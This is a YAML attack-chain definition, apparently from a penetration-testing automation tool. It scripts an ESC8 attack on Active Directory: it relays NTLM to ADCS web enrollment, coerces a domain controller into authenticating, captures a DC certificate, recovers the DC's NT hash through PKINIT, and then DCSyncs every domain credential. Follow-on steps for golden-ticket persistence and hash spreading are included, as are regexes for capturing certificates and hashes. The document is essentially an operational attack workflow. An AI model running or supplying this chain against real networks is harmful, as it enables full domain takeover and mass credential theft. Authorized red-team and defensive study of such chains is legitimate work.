id: ntlm-relay-adcs
name: "Coerce → NTLM Relay → ADCS (ESC8) → DC Hash"
description: >
  Classic ESC8 chain. Start a relay listener pointed at the ADCS web
  enrollment endpoint, coerce the DC into authenticating to you, capture
  a certificate as the DC, then use that certificate to PKINIT-auth and
  recover the DC's NT hash.
tags: [adcs, esc8, ntlm-relay, coercion, certificates, active-directory]
difficulty: hard

inputs:
  - name: dc_ip
    description: "Target DC IP (the one we coerce)."
    source: target_context.ip
    required: true
  - name: adcs_ip
    description: "IP of the ADCS server hosting /certsrv/."
    required: true
  - name: listener_ip
    description: "Your attacker IP — where ntlmrelayx is listening."
    required: true
  - name: domain
    source: target_context.domain

steps:
  - id: relay_listener
    name: "Start the relay to ADCS web enrollment"
    notes: |
      Run this FIRST and leave it running. The DomainController template is
      a safe default; some environments use Machine or DomainControllerAuthentication.
    command_ref: ntlmrelayx-adcs
    inputs:
      ip: "${adcs_ip}"
      template: "DomainController"
    capture:
      - var: dc_pfx
        regex: 'Base64 certificate of user[^:]*:\s*([A-Za-z0-9+/=]+)'
        match: first
      - var: dc_pfx_file
        regex: 'Saving PFX to ([^\s]+\.pfx)'
        match: first

  - id: coerce_auth
    name: "Coerce the DC into authenticating to your listener"
    notes: |
      PetitPotam, DFSCoerce, PrinterBug — Coercer tries them all. The DC
      will then hit /certsrv/, get relayed by ntlmrelayx, and a cert pops
      out in the listener window above.
    command_ref: coercer
    inputs:
      listener_ip: "${listener_ip}"
      target_ip: "${dc_ip}"

  - id: pkinit_auth
    name: "Authenticate with the DC certificate"
    notes: |
      certipy auth performs PKINIT, returns both a TGT and the DC's NT hash.
      Once you have the NT hash you own the domain.
    command_ref: certipy-auth
    requires: [dc_pfx_file]
    inputs:
      pfx_file: "${dc_pfx_file}"
      ip: "${dc_ip}"
    capture:
      - var: dc_nt_hash
        regex: '(?:NT hash|Got hash for[^:]+):[^a-f0-9]*([a-f0-9]{32})'
        match: first

  - id: dump_with_dc_hash
    name: "DCSync with the DC machine account"
    command_ref: secretsdump
    requires: [dc_nt_hash]
    notes: |
      Use the DC machine-account hash (computername$) with secretsdump in
      its NTLM-hash variation to DCSync every credential in the domain.

references:
  - title: "ESC8 — SpecterOps ADCS Attacks"
    url:   "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
  - title: "Coercer"
    url:   "https://github.com/p0dalirius/Coercer"
  - title: "Certipy"
    url:   "https://github.com/ly4k/Certipy"

next_chains:
  - chain: ad-persistence-golden-ticket
    when:   'dc_nt_hash captured'
    reason: 'DA hash → Golden Ticket.'
  - chain: pth-lateral-spread
    when:   'dc_nt_hash captured'
    reason: 'Spread the DA hash.'
